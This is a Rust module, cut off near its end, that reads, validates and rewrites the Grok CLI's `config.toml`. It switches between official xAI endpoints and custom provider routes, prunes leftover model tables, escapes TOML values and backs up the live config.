//! Grok Build live config helpers (`~/.grok/config.toml`).
//! Enabling a supplier only patches `[models].default` and `[model."<id>"]`.
//! Previous GUI supplier tables are pruned so switches do not stack identities.

use std::fs;
use std::path::PathBuf;

use serde_json::{json, Value};
use toml_edit::DocumentMut;

use super::models::Provider;

/// Official default model (Grok Build docs + `grok models`).
pub const DEFAULT_MODEL: &str = "grok-4.5";
/// Live-only `[model."<id>"]` identity while local routing is on.
/// Official treats `<id>` as the Grok model identity; custom channels use the
/// supplier name, and the local proxy is itself a supplier named `localproxy`.
pub const LOCAL_PROXY_MODEL_ID: &str = "localproxy";
/// Project default for *custom* third-party profiles (Responses-friendly).
/// Official built-in models omit `api_backend` (Grok defaults to chat_completions).
pub const DEFAULT_API_BACKEND: &str = "responses";
pub const DEFAULT_CONTEXT_WINDOW: i64 = 500_000;
/// Official xAI Platform API (API-key / BYOK path).
pub const OFFICIAL_API_BASE_URL: &str = "https://api.x.ai/v1";
/// Official Grok CLI chat proxy used with SpaceXAI / grok.com OAuth.
pub const OFFICIAL_CLI_CHAT_PROXY: &str = "https://cli-chat-proxy.grok.com/v1";

/// Canonical official profile: default model only, no custom `[model.*]` base_url.
/// Auth is `~/.grok/auth.json` via `grok login` (or `XAI_API_KEY` env).
pub fn official_settings_config() -> Value {
    json!({ "config": official_config_toml() })
}

pub fn official_config_toml() -> String {
    format!(
        r#"# ChatGPT Tools · Grok Official
# Default model uses built-in SpaceXAI hosting (OAuth via grok login).
# CLI chat proxy: {proxy}
# Platform API:   {api}  (XAI_API_KEY)
# Do not add [model.*] base_url overrides here.

[models]
default = {model}
"#,
        proxy = OFFICIAL_CLI_CHAT_PROXY,
        api = OFFICIAL_API_BASE_URL,
        model = toml_string(DEFAULT_MODEL),
    )
}

pub fn is_official_base_url(url: &str) -> bool {
    let u = url.trim().trim_end_matches('/').to_ascii_lowercase();
    u == OFFICIAL_API_BASE_URL
        || u == "https://api.x.ai"
        || u == OFFICIAL_CLI_CHAT_PROXY
        || u.starts_with("https://cli-chat-proxy.grok.com")
}

pub fn grok_home_dir() -> PathBuf {
    crate::sessions::default_grok_home_dir()
}

pub fn config_path() -> PathBuf {
    grok_home_dir().join("config.toml")
}

pub fn read_config_text() -> Result<String, String> {
    let path = config_path();
    if !path.exists() {
        return Ok(String::new());
    }
    fs::read_to_string(&path).map_err(|e| format!("读取 Grok config.toml 失败: {e}"))
}

pub fn validate_syntax(config_toml: &str) -> Result<(), String> {
    if config_toml.trim().is_empty() {
        return Ok(());
    }
    config_toml
        .parse::<toml::Value>()
        .map(|_| ())
        .map_err(|e| format!("Grok config.toml 格式错误: {e}"))
}

/// Full custom-model shape validation (non-official).
pub fn validate_custom(config_toml: &str) -> Result<(), String> {
    let document = config_toml
        .parse::<toml::Value>()
        .map_err(|e| format!("Grok config.toml 格式错误: {e}"))?;
    let root = document
        .as_table()
        .ok_or_else(|| "Grok 配置必须是 TOML 表结构".to_string())?;
    let models = root
        .get("models")
        .and_then(|v| v.as_table())
        .ok_or_else(|| "Grok 配置缺少 [models]".to_string())?;
    let default_model = models
        .get("default")
        .and_then(|v| v.as_str())
        .map(str::trim)
        .filter(|s| !s.is_empty())
        .ok_or_else(|| "Grok 配置缺少 models.default".to_string())?;
    let model_entries = root
        .get("model")
        .and_then(|v| v.as_table())
        .ok_or_else(|| "Grok 配置缺少 [model.<name>]".to_string())?;
    let selected = model_entries
        .get(default_model)
        .and_then(|v| v.as_table())
        .ok_or_else(|| format!("Grok 配置缺少 [model.\"{default_model}\"]"))?;

    for key in ["model", "base_url", "name", "api_backend"] {
        let ok = selected
            .get(key)
            .and_then(|v| v.as_str())
            .map(str::trim)
            .is_some_and(|s| !s.is_empty());
        if !ok {
            return Err(format!("Grok 配置缺少有效的 {key} 字段"));
        }
    }
    let has_key = selected
        .get("api_key")
        .and_then(|v| v.as_str())
        .map(str::trim)
        .is_some_and(|s| !s.is_empty())
        || selected
            .get("env_key")
            .and_then(|v| v.as_str())
            .map(str::trim)
            .is_some_and(|s| !s.is_empty());
    if !has_key {
        return Err("Grok 配置缺少 api_key 或 env_key".into());
    }
    let cw = selected
        .get("context_window")
        .and_then(|v| v.as_integer())
        .filter(|v| *v > 0);
    if cw.is_none() {
        return Err("Grok context_window 必须是正整数".into());
    }
    Ok(())
}

pub fn validate_for_switch(provider: &Provider) -> Result<(), String> {
    if provider.is_official() {
        return Ok(());
    }
    let config = provider
        .settings_config
        .get("config")
        .and_then(|v| v.as_str())
        .ok_or_else(|| "Grok 配置缺少 config 字段".to_string())?;
    validate_custom(config)
}

/// Keep `[model.<id>]` / `[models].default` as a TOML-safe ASCII slug.
/// Non-ASCII (including Chinese), spaces, and punctuation become `-`.
/// Pure CJK / empty input gets a stable `p-<hash>` so two Chinese names
/// do not collapse onto the same table key.
pub fn sanitize_profile_name(name: &str) -> String {
    let raw = name.trim();
    let mut out = String::new();
    for ch in raw.chars() {
        if ch.is_ascii_alphanumeric() {
            out.push(ch.to_ascii_lowercase());
        } else if ch == '-' || ch == '_' || ch.is_whitespace() {
            if !out.ends_with('-') {
                out.push('-');
            }
        }
    }
    let trimmed = out.trim_matches('-');
    if trimmed.is_empty() {
        format!("p-{:08x}", fnv1a32(raw.as_bytes()))
    } else {
        trimmed.chars().take(32).collect()
    }
}

fn fnv1a32(bytes: &[u8]) -> u32 {
    let mut hash: u32 = 2_166_136_261;
    for b in bytes {
        hash ^= u32::from(*b);
        hash = hash.wrapping_mul(16_777_619);
    }
    hash
}

fn identity_from(raw: &str) -> Option<String> {
    let raw = raw.trim();
    if raw.is_empty() || raw == LOCAL_PROXY_MODEL_ID {
        return None;
    }
    let sanitized = sanitize_profile_name(raw);
    if sanitized.is_empty() || sanitized == LOCAL_PROXY_MODEL_ID {
        None
    } else {
        Some(sanitized)
    }
}

/// Custom `[model."<id>"]` / `[models].default` identity.
/// Prefer an explicit profile; otherwise the supplier name. Both are
/// slugified so Chinese / spaces / quotes never become a live table key.
/// Never `localproxy` (that key is reserved for live local-routing).
pub fn resolve_model_identity(profile: &str, provider_name: &str) -> String {
    identity_from(profile)
        .or_else(|| identity_from(provider_name))
        .unwrap_or_else(|| DEFAULT_MODEL.to_string())
}

/// Official `[model.<id>].name` = picker label. Never the supplier name.
/// Empty / `localproxy` fall back to the upstream model id (e.g. grok-4.6).
pub fn resolve_picker_name(picker: &str, model: &str) -> String {
    let picker = picker.trim();
    if !picker.is_empty() && picker != LOCAL_PROXY_MODEL_ID {
        return picker.to_string();
    }
    let model = model.trim();
    if !model.is_empty() {
        return model.to_string();
    }
    DEFAULT_MODEL.to_string()
}

/// Picker label for the edit form: keep a real label; migrate leftover
/// supplier-name / localproxy values to the upstream model id.
pub fn picker_name_for_form(stored: &str, supplier_name: &str, model: &str) -> String {
    let stored = stored.trim();
    let supplier = supplier_name.trim();
    if stored.is_empty()
        || stored == LOCAL_PROXY_MODEL_ID
        || (!supplier.is_empty() && stored == supplier)
    {
        return resolve_picker_name("", model);
    }
    stored.to_string()
}

pub fn build_custom_config_with_picker(
    profile: &str,
    model: &str,
    base_url: &str,
    provider_name: &str,
    picker_name: &str,
    api_key: &str,
    api_backend: &str,
    context_window: i64,
) -> String {
    let profile = resolve_model_identity(profile, provider_name);
    let model = if model.trim().is_empty() {
        DEFAULT_MODEL
    } else {
        model.trim()
    };
    let base_url = base_url.trim().trim_end_matches('/');
    let name = resolve_picker_name(picker_name, model);
    let backend = normalize_api_backend(api_backend);
    let cw = if context_window > 0 {
        context_window
    } else {
        DEFAULT_CONTEXT_WINDOW
    };
    format!(
        r#"[models]
default = {profile_q}

[model.{profile_q}]
model = {model_q}
base_url = {url_q}
name = {name_q}
api_key = {key_q}
api_backend = {backend_q}
context_window = {cw}
"#,
        profile_q = toml_string(&profile),
        model_q = toml_string(model),
        url_q = toml_string(base_url),
        name_q = toml_string(&name),
        key_q = toml_string(api_key),
        backend_q = toml_string(&backend),
        cw = cw,
    )
}

pub fn normalize_api_backend(backend: &str) -> String {
    match backend.trim().to_ascii_lowercase().as_str() {
        "chat" | "chat_completions" | "openai_chat" | "completions" => {
            "chat_completions".into()
        }
        "messages" | "anthropic" => "messages".into(),
        _ => DEFAULT_API_BACKEND.into(),
    }
}

/// TOML basic-string encoding. Never interpolates raw user text (quotes,
/// backslashes, and control chars are escaped) so a hostile model / name
/// cannot inject extra TOML lines.
fn toml_string(value: &str) -> String {
    let mut out = String::with_capacity(value.len() + 2);
    out.push('"');
    for ch in value.chars() {
        match ch {
            '"' => out.push_str("\\\""),
            '\\' => out.push_str("\\\\"),
            '\u{0008}' => out.push_str("\\b"),
            '\t' => out.push_str("\\t"),
            '\n' => out.push_str("\\n"),
            '\u{000c}' => out.push_str("\\f"),
            '\r' => out.push_str("\\r"),
            c if c.is_control() => {
                let n = c as u32;
                if n <= 0xFFFF {
                    out.push_str(&format!("\\u{n:04x}"));
                } else {
                    out.push_str(&format!("\\U{n:08x}"));
                }
            }
            c => out.push(c),
        }
    }
    out.push('"');
    out
}

struct GrokFields {
    profile: String,
    model: String,
    base_url: String,
    name: String,
    api_key: Option<String>,
    api_backend: String,
    context_window: i64,
}

/// `[models].default` is the catalog identity (table key), not the API model id.
fn read_default_identity(config: &str) -> Option<String> {
    config
        .parse::<toml::Value>()
        .ok()?
        .get("models")?
        .as_table()?
        .get("default")?
        .as_str()
        .map(str::trim)
        .filter(|s| !s.is_empty())
        .map(str::to_string)
}

fn extract_fields(config_toml: &str) -> Option<GrokFields> {
    let document = config_toml.parse::<toml::Value>().ok()?;
    let root = document.as_table()?;
    let model_entries = root.get("model")?.as_table()?;
    let profile = root
        .get("models")
        .and_then(|v| v.as_table())
        .and_then(|t| t.get("default"))
        .and_then(|v| v.as_str())
        .map(str::trim)
        .filter(|s| !s.is_empty())?
        .to_string();
    let selected = model_entries.get(&profile)?.as_table()?;
    let context_window = selected
        .get("context_window")
        .and_then(|v| v.as_integer())
        .filter(|v| *v > 0)
        .unwrap_or(DEFAULT_CONTEXT_WINDOW);
    let api_backend = selected
        .get("api_backend")
        .and_then(|v| v.as_str())
        .map(normalize_api_backend)
        .unwrap_or_else(|| DEFAULT_API_BACKEND.into());
    let model = selected
        .get("model")
        .and_then(|v| v.as_str())
        .map(str::trim)
        .filter(|s| !s.is_empty())
        .unwrap_or(profile.as_str())
        .to_string();
    Some(GrokFields {
        profile: profile.clone(),
        model,
        base_url: selected
            .get("base_url")?
            .as_str()?
            .trim_end_matches('/')
            .to_string(),
        name: selected
            .get("name")
            .and_then(|v| v.as_str())
            .map(str::trim)
            .filter(|s| !s.is_empty())
            .unwrap_or(profile.as_str())
            .to_string(),
        api_key: selected
            .get("api_key")
            .and_then(|v| v.as_str())
            .map(str::trim)
            .filter(|s| !s.is_empty())
            .map(str::to_string),
        api_backend,
        context_window,
    })
}

/// Patch form fields into existing Grok config (preserve MCP / extra keys when present).
pub fn patch_config_from_form(
    existing: &str,
    profile: &str,
    model: &str,
    base_url: &str,
    name: &str,
    api_key: &str,
    api_backend: &str,
    context_window: i64,
) -> Result<String, String> {
    patch_config_from_form_with_picker(
        existing,
        profile,
        model,
        base_url,
        name,
        "",
        api_key,
        api_backend,
        context_window,
    )
}

pub fn patch_config_from_form_with_picker(
    existing: &str,
    profile: &str,
    model: &str,
    base_url: &str,
    provider_name: &str,
    picker_name: &str,
    api_key: &str,
    api_backend: &str,
    context_window: i64,
) -> Result<String, String> {
    let identity = resolve_model_identity(profile, provider_name);
    let model = if model.trim().is_empty() {
        DEFAULT_MODEL
    } else {
        model.trim()
    };
    let base_url = base_url.trim().trim_end_matches('/');
    let name = resolve_picker_name(picker_name, model);
    let backend = normalize_api_backend(api_backend);
    let cw = if context_window > 0 {
        context_window
    } else {
        DEFAULT_CONTEXT_WINDOW
    };

    if existing.trim().is_empty() {
        return Ok(build_custom_config_with_picker(
            &identity,
            model,
            base_url,
            provider_name,
            &name,
            api_key,
            &backend,
            cw,
        ));
    }

    let old_default = read_default_identity(existing);

    let mut doc = existing
        .parse::<DocumentMut>()
        .map_err(|e| format!("Invalid Grok config.toml: {e}"))?;

    // [models].default 必须等于 identity
    {
        let root = doc.as_table_mut();
        if !root.contains_key("models") {
            root.insert("models", toml_edit::Item::Table(toml_edit::Table::new()));
        }
        let models = root
            .get_mut("models")
            .and_then(|i| i.as_table_like_mut())
            .ok_or_else(|| "Grok config.toml 中 [models] 非法".to_string())?;
        models.insert("default", toml_edit::value(identity.as_str()));
    }

    // [model.<identity>]  — supplier name (or explicit profile), never the upstream id
    {
        let root = doc.as_table_mut();
        if !root.contains_key("model") {
            root.insert("model", toml_edit::Item::Table(toml_edit::Table::new()));
        }
        let model_root = root
            .get_mut("model")
            .and_then(|i| i.as_table_like_mut())
            .ok_or_else(|| "Grok config.toml 中 [model] 非法".to_string())?;
        if model_root.get(&identity).is_none() {
            model_root.insert(&identity, toml_edit::Item::Table(toml_edit::Table::new()));
        }
        let table = model_root
            .get_mut(&identity)
            .and_then(|i| i.as_table_like_mut())
            .ok_or_else(|| format!("Grok config.toml 中 [model.\"{identity}\"] 非法"))?;
        table.insert("model", toml_edit::value(model));
        table.insert("base_url", toml_edit::value(base_url));
        table.insert("name", toml_edit::value(name));
        table.insert("api_backend", toml_edit::value(backend.as_str()));
        table.insert("context_window", toml_edit::value(cw));
        if api_key.trim().is_empty() {
            // leave existing key if present
            if table
                .get("api_key")
                .and_then(|i| i.as_str())
                .map(str::trim)
                .filter(|s| !s.is_empty())
                .is_none()
                && table
                    .get("env_key")
                    .and_then(|i| i.as_str())
                    .map(str::trim)
                    .filter(|s| !s.is_empty())
                    .is_none()
            {
                // no key yet — allow draft; validate_custom will catch on activate
            }
        } else {
            table.insert("api_key", toml_edit::value(api_key.trim()));
        }

        // Previous GUI supplier + localproxy + leftover third-party routes go away.
        // User extras without a custom endpoint stay.
        let mut drop = vec![LOCAL_PROXY_MODEL_ID.to_string()];
        if let Some(old) = old_default {
            if old != identity {
                drop.push(old);
            }
        }
        if model != identity {
            drop.push(model.to_string());
        }
        prune_model_tables(model_root, &identity, &drop);
    }

    Ok(doc.to_string())
}

fn table_has_third_party_base_url(table: &dyn toml_edit::TableLike) -> bool {
    table
        .get("base_url")
        .and_then(|i| i.as_str())
        .map(str::trim)
        .filter(|s| !s.is_empty())
        .is_some_and(|url| !is_official_base_url(url))
}

fn prune_model_tables(
    model_root: &mut dyn toml_edit::TableLike,
    keep: &str,
    extra_drop: &[String],
) {
    let keys: Vec<String> = model_root.iter().map(|(k, _)| k.to_string()).collect();
    for key in keys {
        if key == keep {
            continue;
        }
        if extra_drop.iter().any(|d| d == &key) {
            model_root.remove(&key);
            continue;
        }
        // Leftover GUI supplier tables from earlier switches have a third-party
        // base_url. Drop them so the Grok picker does not stack [model."A"] +
        // [model."B"]. User extras without a custom endpoint stay.
        let is_stale_route = model_root
            .get(&key)
            .and_then(|i| i.as_table_like())
            .is_some_and(table_has_third_party_base_url);
        if is_stale_route {
            model_root.remove(&key);
        }
    }
}

#[derive(Debug, Clone)]
pub struct LiveSnapshot {
    /// `[models].default` catalog identity (table key), even when no matching table exists.
    pub identity: Option<String>,
    pub base_url: Option<String>,
    pub model: Option<String>,
    pub has_api_key: bool,
    pub config_exists: bool,
    pub is_official_shape: bool,
}

pub fn read_live_snapshot() -> LiveSnapshot {
    let config = read_config_text().unwrap_or_default();
    let fields = extract_fields(&config);
    LiveSnapshot {
        identity: read_default_identity(&config),
        base_url: fields.as_ref().map(|f| f.base_url.clone()),
        model: fields.as_ref().map(|f| f.model.clone()),
        has_api_key: fields.as_ref().and_then(|f| f.api_key.as_ref()).is_some(),
        config_exists: config_path().exists(),
        is_official_shape: is_official_live_config(&config),
    }
}

/// Official live shape: no third-party `[model.*].base_url` / `[endpoints].models_base_url`.
/// Having `[models] default = "grok-4.5"` alone is still official (matches Grok docs).
pub fn is_official_live_config(config_toml: &str) -> bool {
    let trimmed = config_toml.trim();
    if trimmed.is_empty() {
        return true;
    }
    if trimmed.lines().all(|l| {
        let t = l.trim();
        t.is_empty() || t.starts_with('#')
    }) {
        return true;
    }
    let Ok(document) = config_toml.parse::<toml::Value>() else {
        return false;
    };
    let Some(root) = document.as_table() else {
        return false;
    };

    // Corporate / custom models endpoint override
    if let Some(url) = root
        .get("endpoints")
        .and_then(|v| v.as_table())
        .and_then(|t| t.get("models_base_url"))
        .and_then(|v| v.as_str())
    {
        if !is_official_base_url(url) {
            return false;
        }
    }

    // Only the *active* [models].default table counts. Unused [model.*]
    // leftovers from a previous supplier must not mark live unofficial.
    let default = root
        .get("models")
        .and_then(|v| v.as_table())
        .and_then(|t| t.get("default"))
        .and_then(|v| v.as_str())
        .map(str::trim)
        .filter(|s| !s.is_empty());
    if let Some(id) = default {
        if let Some(url) = root
            .get("model")
            .and_then(|v| v.as_table())
            .and_then(|t| t.get(id))
            .and_then(|v| v.as_table())
            .and_then(|t| t.get("base_url"))
            .and_then(|v| v.as_str())
        {
            if !is_official_base_url(url) {
                return false;
            }
        }
    }

    true
}

/// Remove custom model endpoint overrides; keep UI / MCP / features / etc.
pub fn strip_to_official_routing(config_toml: &str) -> Result<String, String> {
    if config_toml.trim().is_empty() {
        return Ok(official_config_toml());
    }
    let mut doc = config_toml
        .parse::<DocumentMut>()
        .map_err(|e| format!("Invalid Grok config.toml: {e}"))?;

    // Point [models].default at the built-in official model. Drop leftover
    // GUI supplier tables (third-party base_url) and live-only localproxy.
    // User extras without a custom endpoint stay.
    {
        let root = doc.as_table_mut();
        if !root.contains_key("models") {
            root.insert("models", toml_edit::Item::Table(toml_edit::Table::new()));
        }
        if let Some(models) = root.get_mut("models").and_then(|i| i.as_table_like_mut()) {
            models.insert("default", toml_edit::value(DEFAULT_MODEL));
        }
    }
    if let Some(model_root) = doc.get_mut("model").and_then(|i| i.as_table_like_mut()) {
        prune_model_tables(
            model_root,
            DEFAULT_MODEL,
            &[LOCAL_PROXY_MODEL_ID.to_string()],
        );
        let drop_official = model_root
            .get(DEFAULT_MODEL)
            .and_then(|i| i.as_table_like())
            .and_then(|t| t.get("base_url"))
            .and_then(|i| i.as_str())
            .is_some_and(|url| !is_official_base_url(url));
        if drop_official {
            model_root.remove(DEFAULT_MODEL);
        }
    }

    // Drop non-official endpoints.models_base_url
    if let Some(endpoints) = doc
        .get_mut("endpoints")
        .and_then(|i| i.as_table_like_mut())
    {
        if let Some(url) = endpoints
            .get("models_base_url")
            .and_then(|i| i.as_str())
            .map(str::to_string)
        {
            if !is_official_base_url(&url) {
                endpoints.remove("models_base_url");
            }
        }
    }

    let out = doc.to_string();
    if out.trim().is_empty() {
        return Ok(official_config_toml());
    }
    Ok(out)
}

/// Whether stored provider matches live routing.
///
/// Official: live has no third-party endpoint on the *active* `[models].default`.
/// Custom: `[models].default` must equal the archive identity (table key), and
/// `base_url` must match. Changing `.model` (API id) on the same table is not
/// drift — that is the official way to pick a different upstream id.
pub fn matches_live(provider: &Provider, live: &LiveSnapshot) -> bool {
    if provider.is_official() {
        return live.is_official_shape;
    }
    let (identity, _, _) = summarize_extra(provider);
    if live.identity.as_deref() != Some(identity.as_str()) {
        return false;
    }
    let (key, base, _model) = summarize(provider);
    match (base.as_deref(), live.base_url.as_deref()) {
        (Some(a), Some(b)) if a.trim_end_matches('/') == b.trim_end_matches('/') => {
            key.is_some() == live.has_api_key || live.has_api_key || key.is_some()
        }
        (None, None) => true,
        _ => false,
    }
}

/// Archive / editor fragment: `[models].default` + `[model."<identity>"]` only.
pub fn extract_routing_fragment(config: &str) -> Result<String, String> {
    if config.trim().is_empty() {
        return Ok(String::new());
    }
    if let Some(f) = extract_fields(config) {
        return Ok(build_custom_config_with_picker(
            &f.profile,
            &f.model,
            &f.base_url,
            &f.profile,
            &f.name,
            f.api_key.as_deref().unwrap_or(""),
            &f.api_backend,
            f.context_window,
        ));
    }
    let src = config
        .parse::<DocumentMut>()
        .map_err(|e| format!("Invalid Grok config.toml: {e}"))?;
    let Some(default) = src
        .get("models")
        .and_then(|i| i.as_table())
        .and_then(|t| t.get("default"))
        .cloned()
    else {
        return Ok(String::new());
    };
    let mut out = DocumentMut::new();
    let mut models = toml_edit::Table::new();
    models.insert("default", default);
    out.as_table_mut()
        .insert("models", toml_edit::Item::Table(models));
    Ok(out.to_string())
}

/// Patch only `[models].default` and `[model."<identity>"]` onto live.
/// MCP / ui / features / tools stay as-is. Previous GUI supplier tables
/// (and other leftover third-party routes) are removed so switching
/// providers does not stack `[model."A"]` + `[model."B"]` in the picker.
pub fn apply_routing_to_live(live: &str, archive: &str) -> Result<String, String> {
    if archive.trim().is_empty() {
        return Ok(live.to_string());
    }
    let Some(fields) = extract_fields(archive) else {
        return Err("Grok 供应商档案缺少 [models].default / [model.\"…\"]".into());
    };
    if live.trim().is_empty() {
        return extract_routing_fragment(archive);
    }
    let mut doc = live
        .parse::<DocumentMut>()
        .map_err(|e| format!("Invalid live Grok config.toml: {e}"))?;
    apply_identity_nodes(&mut doc, &fields)?;
    Ok(doc.to_string())
}

fn apply_identity_nodes(doc: &mut DocumentMut, fields: &GrokFields) -> Result<(), String> {
    let old_default = doc
        .get("models")
        .and_then(|i| i.as_table())
        .and_then(|t| t.get("default"))
        .and_then(|i| i.as_str())
        .map(str::trim)
        .filter(|s| !s.is_empty())
        .map(str::to_string);
    {
        let root = doc.as_table_mut();
        if !root.contains_key("models") {
            root.insert("models", toml_edit::Item::Table(toml_edit::Table::new()));
        }
        let models = root
            .get_mut("models")
            .and_then(|i| i.as_table_like_mut())
            .ok_or_else(|| "Grok config.toml 中 [models] 非法".to_string())?;
        models.insert("default", toml_edit::value(fields.profile.as_str()));
    }
    {
        let identity = fields.profile.as_str();
        let root = doc.as_table_mut();
        if !root.contains_key("model") {
            let mut t = toml_edit::Table::new();
            t.set_implicit(true);
            root.insert("model", toml_edit::Item::Table(t));
        }
        let model_root = root
            .get_mut("model")
            .and_then(|i| i.as_table_like_mut())
            .ok_or_else(|| "Grok config.toml 中 [model] 非法".to_string())?;
        if model_root.get(identity).is_none() {
            model_root.insert(identity, toml_edit::Item::Table(toml_edit::Table::new()));
        }
        let table = model_root
            .get_mut(identity)
            .and_then(|i| i.as_table_like_mut())
            .ok_or_else(|| format!("Grok config.toml 中 [model.\"{identity}\"] 非法"))?;
        table.insert("model", toml_edit::value(fields.model.as_str()));
        table.insert("base_url", toml_edit::value(fields.base_url.as_str()));
        table.insert("name", toml_edit::value(fields.name.as_str()));
        table.insert(
            "api_backend",
            toml_edit::value(fields.api_backend.as_str()),
        );
        table.insert("context_window", toml_edit::value(fields.context_window));
        if let Some(key) = fields
            .api_key
            .as_deref()
            .map(str::trim)
            .filter(|s| !s.is_empty())
        {
            table.insert("api_key", toml_edit::value(key));
        }

        let mut drop = vec![LOCAL_PROXY_MODEL_ID.to_string()];
        if let Some(old) = old_default {
            if old != identity {
                drop.push(old);
            }
        }
        if fields.model != identity {
            drop.push(fields.model.clone());
        }
        prune_model_tables(model_root, identity, &drop);
    }
    Ok(())
}

pub fn write_live(provider: &Provider) -> Result<Vec<String>, String> {
    let mut warnings = Vec::new();
    let config = provider
        .settings_config
        .get("config")
        .and_then(|v| v.as_str())
        .ok_or_else(|| "Grok 配置缺少 config 字段".to_string())?;

    if !provider.is_official() {
        validate_custom(config)?;
    } else {
        validate_syntax(config)?;
    }

    let path = config_path();
    if let Some(parent) = path.parent() {
        fs::create_dir_all(parent).map_err(|e| format!("创建 ~/.grok 失败: {e}"))?;
    }

    // Locked read-modify-write so proxy/skin (Codex) style races are avoided on Grok too.
    let is_official = provider.is_official();
    let archive = config.to_string();
    crate::live_config::read_modify_write(&path, |live_existing| {
        let _ = backup_live(live_existing);
        if is_official {
            let base = if live_existing.trim().is_empty() {
                if archive.trim().is_empty() {
                    official_config_toml()
                } else {
                    archive.clone()
                }
            } else {
                strip_to_official_routing(live_existing)?
            };
            Ok(base)
        } else {
            apply_routing_to_live(live_existing, &archive)
        }
    })?;

    if is_official {
        warnings.push("已切换为 Grok 官方默认渠道。".into());
    }
    // Silent path write — GUI already confirms enable; avoid engineering paths in toast.
    Ok(warnings)
}



fn backup_live(live_config: &str) -> Result<(), String> {
    if live_config.is_empty() {
        return Ok(());
    }
    let dir = crate::sessions::paths::app_state_dir().join("provider-live-backups");
    fs::create_dir_all(&dir).map_err(|e| e.to_string())?;
    let stamp = chrono::Utc::now().format("%Y%m%d-%H%M%S");
    let path = dir.join(format!("grok-config-{stamp}.toml"));
    fs::write(path, live_config).map_err(|e| e.to_string())?;
    Ok(())
}

pub fn backfill_from_live(provider: &mut Provider) -> Result<(), String> {
    if provider.is_official() {
        return Ok(());
    }
    let live = read_config_text()?;
    if live.trim().is_empty() || is_official_live_config(&live) {
        return Ok(());
    }
    let live_fields = match extract_fields(&live) {
        Some(f) => f,
        None => return Ok(()),
    };
    // Never backfill loopback proxy URLs into archives.
    {
        let cfg = super::store::load().map(|f| f.proxy).unwrap_or_default();
        if crate::proxy::is_proxy_base_url(&live_fields.base_url, &cfg)
            || live_fields.base_url.contains("127.0.0.1")
        {
            return Ok(());
        }
    }
    let stored_base = provider
        .settings_config
        .get("config")
        .and_then(|v| v.as_str())
        .and_then(extract_fields)
        .map(|f| f.base_url);
    if stored_base.as_deref() != Some(live_fields.base_url.as_str()) {
        return Ok(());
    }
    // Store routing fragment only — MCP / ui / features stay live-only.
    let fragment = extract_routing_fragment(&live).unwrap_or(live);
    if let Some(obj) = provider.settings_config.as_object_mut() {
        obj.insert("config".into(), Value::String(fragment));
    }
    provider.updated_at = Some(chrono::Utc::now().timestamp_millis());
    Ok(())
}



pub fn settings_from_form(
    api_key: Option<&str>,
    base_url: Option<&str>,
    model: Option<&str>,
    config_toml: Option<&str>,
    name: &str,
    category: Option<&str>,
    existing: Option<&Provider>,
    keep_existing_key: bool,
    profile: Option<&str>,
    api_backend: Option<&str>,
    context_window: Option<i64>,
    use_config_toml: bool,
    display_name: Option<&str>,
) -> Result<Value, String> {
    let is_official = category == Some("official");
    if is_official {
        // Always keep canonical official defaults — never promote live imports.
        return Ok(official_settings_config());
    }

    let mut key = api_key.map(str::trim).unwrap_or("").to_string();
    if key.is_empty() && keep_existing_key {
        if let Some(p) = existing {
            if let Some(prev) = p
                .settings_config
                .get("config")
                .and_then(|v| v.as_str())
                .and_then(extract_fields)
                .and_then(|f| f.api_key)
            {
                key = prev;
            }
        }
    }

    let raw_toml = config_toml.map(str::trim).filter(|s| !s.is_empty());
    let form_url = base_url.map(str::trim).filter(|s| !s.is_empty());
    let advanced = use_config_toml || (raw_toml.is_some() && form_url.is_none());

    if advanced {
        let raw = raw_toml.ok_or_else(|| "高级模式需要填写 config.toml".to_string())?;
        let mut text = extract_routing_fragment(raw)?;
        if text.trim().is_empty() {
            return Err("高级 config.toml 中缺少 [models].default / [model.\"…\"]".into());
        }
        // If key provided and differs, inject into TOML
        if let Some(fields) = extract_fields(&text) {
            if !key.is_empty() && fields.api_key.as_deref() != Some(key.as_str()) {
                text = patch_config_from_form(
                    &text,
                    &fields.profile,
                    &fields.model,
                    &fields.base_url,
                    &fields.name,
                    &key,
                    &fields.api_backend,
                    fields.context_window,
                )?;
            }
        }
        // Drafts without key: syntax only; complete configs: full validate
        if extract_fields(&text)
            .and_then(|f| f.api_key)
            .filter(|k| !k.is_empty())
            .is_some()
        {
            validate_custom(&text)?;
        } else {
            validate_syntax(&text)?;
        }
        return Ok(json!({ "config": text }));
    }

    let url = form_url.unwrap_or("");
    if url.is_empty() {
        return Err("请填写 Base URL".into());
    }
    if !(url.starts_with("http://") || url.starts_with("https://")) {
        return Err("Base URL 必须以 http:// 或 https:// 开头".into());
    }
    let model_val = model
        .map(str::trim)
        .filter(|s| !s.is_empty())
        .unwrap_or(DEFAULT_MODEL);
    let profile_val = resolve_model_identity(profile.unwrap_or(""), name);
    let backend = api_backend.unwrap_or(DEFAULT_API_BACKEND);
    let cw = context_window
        .filter(|v| *v > 0)
        .unwrap_or(DEFAULT_CONTEXT_WINDOW);

    let existing_cfg = existing
        .and_then(|p| p.settings_config.get("config"))
        .and_then(|v| v.as_str())
        .unwrap_or("");
    let existing_fragment =
        extract_routing_fragment(existing_cfg).unwrap_or_else(|_| existing_cfg.to_string());

    let picker = resolve_picker_name(display_name.unwrap_or(""), model_val);
    let text = if existing_fragment.trim().is_empty() {
        build_custom_config_with_picker(
            &profile_val,
            model_val,
            url,
            name,
            &picker,
            &key,
            backend,
            cw,
        )
    } else {
        patch_config_from_form_with_picker(
            &existing_fragment,
            &profile_val,
            model_val,
            url,
            name,
            &picker,
            &key,
            backend,
            cw,
        )?
    };

    if key.is_empty() {
        validate_syntax(&text)?;
    } else {
        validate_custom(&text)?;
    }
    Ok(json!({ "config": text }))
}

pub fn summarize(provider: &Provider) -> (Option<String>, Option<String>, Option<String>) {
    if provider.is_official() {
        return (
            None,
            Some(OFFICIAL_CLI_CHAT_PROXY.into()),
            Some(DEFAULT_MODEL.into()),
        );
    }
    let config = provider
        .settings_config
        .get("config")
        .and_then(|v| v.as_str())
        .unwrap_or("");
    if let Some(f) = extract_fields(config) {
        (f.api_key, Some(f.base_url), Some(f.model))
    } else {
        (None, None, None)
    }
}

pub fn summarize_extra(provider: &Provider) -> (String, String, i64) {
    if provider.is_official() {
        return (DEFAULT_MODEL.into(), "built-in".into(), 0);
    }
    let config = provider
        .settings_config
        .get("config")
        .and_then(|v| v.as_str())
        .unwrap_or("");
    if let Some(f) = extract_fields(config) {
        (f.profile, f.api_backend, f.context_window)
    } else {
        (DEFAULT_MODEL.into(), DEFAULT_API_BACKEND.into(), DEFAULT_CONTEXT_WINDOW)
    }
}

pub fn summarize_picker_name(provider: &Provider) -> String {
    if provider.is_official() {
